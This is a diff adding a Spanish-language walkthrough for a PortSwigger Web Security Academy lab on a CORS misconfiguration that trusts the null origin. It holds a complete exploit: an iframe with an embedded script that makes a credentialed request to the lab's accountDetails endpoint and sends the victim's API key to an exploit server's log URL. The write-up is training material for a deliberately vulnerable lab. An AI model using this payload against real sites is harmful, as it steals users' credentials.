@@ -702,8 +702,29 @@ req.withCredentials = true;
 req.send();
 function reqListener() {
     var x = JSON.parse(this.responseText);
-    location='/log?key='+ x.apikey;
+    location='/log?key=' + x.apikey;
 };
+```
+
+### [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+
+Este laboratorio es muy similar al anterior, difiriendo en que, al mandar la request al repeater y setear el header Origin como null, la respuesta tendrá el encabezado Access-Control-Allow-Origin como null.
+
+Para resolver este lab, copiamos la url de la sección Home, y le anexamos "accountDetails" (debido a que a esta url se hacen las peticiones que devuelve la apikey, se puede ver analizando el HTTP History de burpsuite), y la pegamos en la línea del req.open del siguiente script. Por último, copiamos la url del exploit server del laboratorio y la pegamos en la línea location, a la cual le concatenamos la apikey de la respuesta (también se podría usar un servidor externo como el burp collaborator).
+Luego de pulsar el botón deliver exploit to victim, debemos ver las respuestas del servidor yendo a la sección Acces log. Una vez allí, buscamos "log?key", y lo que sigue será el apikey que debemos enviar.
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+        var req = new XMLHttpRequest ();
+        req.onload = reqListener;
+        req.open('get','https://ac6c1f321e10fef48028145c000f0017.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();  
+        function reqListener() {
+            var x = JSON.parse(this.responseText);
+            location='https://ac281f0c1eb1fe6c80d814b401080062.web-security-academy.net/log?key='+x.apikey;
+        };
+     </script>"></iframe>
 ```
 
 ---
